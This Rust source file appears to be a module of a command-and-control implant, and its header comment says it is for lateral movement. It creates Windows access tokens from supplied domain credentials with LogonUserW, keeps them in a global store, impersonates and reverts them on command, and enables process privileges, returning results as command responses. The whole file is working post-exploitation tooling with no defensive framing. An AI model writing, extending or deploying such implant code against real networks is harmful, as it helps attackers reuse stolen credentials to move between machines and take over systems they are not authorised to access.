//! Token management module for lateral movement.
//!
//! Provides Windows access token creation, storage, and impersonation
//! for lateral movement operations.

use std::collections::HashMap;
use std::sync::atomic::{AtomicU32, Ordering};
use parking_lot::RwLock;
use once_cell::sync::Lazy;

use windows::Win32::Foundation::{HANDLE, CloseHandle, LUID};
use windows::Win32::Security::{
    LogonUserW, ImpersonateLoggedOnUser, RevertToSelf, DuplicateTokenEx,
    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
    TOKEN_ALL_ACCESS, SecurityImpersonation, TokenPrimary,
    AdjustTokenPrivileges, LookupPrivilegeValueW, SE_PRIVILEGE_ENABLED,
    TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
};
use windows::Win32::System::Threading::{OpenProcessToken, GetCurrentProcess};
use windows::core::PCWSTR;

use wavegate_shared::{CommandResponseData, TokenInfo};

/// Counter for generating unique token IDs
static TOKEN_ID_COUNTER: AtomicU32 = AtomicU32::new(1);

/// Stored token with metadata
struct StoredToken {
    handle: HANDLE,
    domain: String,
    username: String,
    token_type: String,
}

// Implement Send + Sync for StoredToken since HANDLE is just a pointer
// and we're careful about thread safety with RwLock
unsafe impl Send for StoredToken {}
unsafe impl Sync for StoredToken {}

impl Drop for StoredToken {
    fn drop(&mut self) {
        unsafe {
            let _ = CloseHandle(self.handle);
        }
    }
}

/// Global token store
static TOKEN_STORE: Lazy<RwLock<HashMap<u32, StoredToken>>> = Lazy::new(|| RwLock::new(HashMap::new()));

/// Currently active impersonation token ID (0 = none)
static ACTIVE_TOKEN_ID: AtomicU32 = AtomicU32::new(0);

/// Create a new access token from credentials using LogonUser
pub fn make_token(domain: &str, username: &str, password: &str) -> (bool, CommandResponseData) {
    // Convert strings to wide
    let domain_wide: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
    let username_wide: Vec<u16> = username.encode_utf16().chain(std::iter::once(0)).collect();
    let password_wide: Vec<u16> = password.encode_utf16().chain(std::iter::once(0)).collect();

    let mut token_handle = HANDLE::default();

    let result = unsafe {
        LogonUserW(
            PCWSTR(username_wide.as_ptr()),
            PCWSTR(domain_wide.as_ptr()),
            PCWSTR(password_wide.as_ptr()),
            LOGON32_LOGON_NEW_CREDENTIALS,  // Network credentials only
            LOGON32_PROVIDER_WINNT50,
            &mut token_handle,
        )
    };

    match result {
        Ok(_) => {
            // Duplicate token for impersonation
            let mut dup_token = HANDLE::default();
            let dup_result = unsafe {
                DuplicateTokenEx(
                    token_handle,
                    TOKEN_ALL_ACCESS,
                    None,
                    SecurityImpersonation,
                    TokenPrimary,
                    &mut dup_token,
                )
            };

            // Close original token
            unsafe { let _ = CloseHandle(token_handle); }

            match dup_result {
                Ok(_) => {
                    let token_id = TOKEN_ID_COUNTER.fetch_add(1, Ordering::SeqCst);

                    let stored = StoredToken {
                        handle: dup_token,
                        domain: domain.to_string(),
                        username: username.to_string(),
                        token_type: "Primary".to_string(),
                    };

                    TOKEN_STORE.write().insert(token_id, stored);

                    (true, CommandResponseData::TokenCreated {
                        token_id,
                        domain: domain.to_string(),
                        username: username.to_string(),
                    })
                }
                Err(e) => {
                    (false, CommandResponseData::Error {
                        message: format!("Failed to duplicate token: {}", e),
                    })
                }
            }
        }
        Err(e) => {
            (false, CommandResponseData::Error {
                message: format!("Failed to create token: {}", e),
            })
        }
    }
}

/// List all stored tokens
pub fn list_tokens() -> (bool, CommandResponseData) {
    let store = TOKEN_STORE.read();
    let active_id = ACTIVE_TOKEN_ID.load(Ordering::SeqCst);

    let tokens: Vec<TokenInfo> = store.iter().map(|(id, token)| {
        TokenInfo {
            id: *id,
            domain: token.domain.clone(),
            username: token.username.clone(),
            active: *id == active_id,
            token_type: token.token_type.clone(),
        }
    }).collect();

    (true, CommandResponseData::TokenListResult { tokens })
}

/// Impersonate a stored token by ID
pub fn impersonate_token(token_id: u32) -> (bool, CommandResponseData) {
    let store = TOKEN_STORE.read();

    let token = match store.get(&token_id) {
        Some(t) => t,
        None => {
            return (false, CommandResponseData::TokenImpersonateResult {
                success: false,
                message: format!("Token ID {} not found", token_id),
            });
        }
    };

    let result = unsafe { ImpersonateLoggedOnUser(token.handle) };

    match result {
        Ok(_) => {
            ACTIVE_TOKEN_ID.store(token_id, Ordering::SeqCst);
            (true, CommandResponseData::TokenImpersonateResult {
                success: true,
                message: format!("Successfully impersonating: {}\\{}", token.domain, token.username),
            })
        }
        Err(e) => {
            (false, CommandResponseData::TokenImpersonateResult {
                success: false,
                message: format!("Failed to impersonate token: {}", e),
            })
        }
    }
}

/// Revert to the original process token
pub fn revert_token() -> (bool, CommandResponseData) {
    let result = unsafe { RevertToSelf() };

    match result {
        Ok(_) => {
            ACTIVE_TOKEN_ID.store(0, Ordering::SeqCst);
            (true, CommandResponseData::TokenRevertResult {
                success: true,
                message: "Successfully reverted to original token".to_string(),
            })
        }
        Err(e) => {
            (false, CommandResponseData::TokenRevertResult {
                success: false,
                message: format!("Failed to revert token: {}", e),
            })
        }
    }
}

/// Delete a token by ID
pub fn delete_token(token_id: u32) -> (bool, CommandResponseData) {
    // If this token is currently impersonated, revert first
    if ACTIVE_TOKEN_ID.load(Ordering::SeqCst) == token_id {
        let _ = unsafe { RevertToSelf() };
        ACTIVE_TOKEN_ID.store(0, Ordering::SeqCst);
    }

    let mut store = TOKEN_STORE.write();

    match store.remove(&token_id) {
        Some(_) => {
            // Token handle closed automatically via Drop
            (true, CommandResponseData::TokenDeleteResult {
                success: true,
                message: format!("Token {} deleted", token_id),
            })
        }
        None => {
            (false, CommandResponseData::TokenDeleteResult {
                success: false,
                message: format!("Token ID {} not found", token_id),
            })
        }
    }
}

/// Get the currently active token ID (0 if none)
pub fn get_active_token_id() -> u32 {
    ACTIVE_TOKEN_ID.load(Ordering::SeqCst)
}

/// Check if a token is currently being impersonated
pub fn is_impersonating() -> bool {
    ACTIVE_TOKEN_ID.load(Ordering::SeqCst) != 0
}

/// Enable a privilege on the current process token
#[allow(dead_code)]
pub fn enable_privilege(privilege_name: &str) -> Result<(), String> {
    let priv_wide: Vec<u16> = privilege_name.encode_utf16().chain(std::iter::once(0)).collect();

    let mut token_handle = HANDLE::default();
    let mut luid = LUID::default();

    unsafe {
        // Open process token
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token_handle,
        ).map_err(|e| format!("Failed to open process token: {}", e))?;

        // Lookup privilege LUID
        LookupPrivilegeValueW(
            PCWSTR::null(),
            PCWSTR(priv_wide.as_ptr()),
            &mut luid,
        ).map_err(|e| {
            let _ = CloseHandle(token_handle);
            format!("Failed to lookup privilege: {}", e)
        })?;

        // Adjust token privileges
        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        AdjustTokenPrivileges(
            token_handle,
            false,
            Some(&mut tp),
            0,
            None,
            None,
        ).map_err(|e| {
            let _ = CloseHandle(token_handle);
            format!("Failed to adjust privileges: {}", e)
        })?;

        let _ = CloseHandle(token_handle);
    }

    Ok(())
}
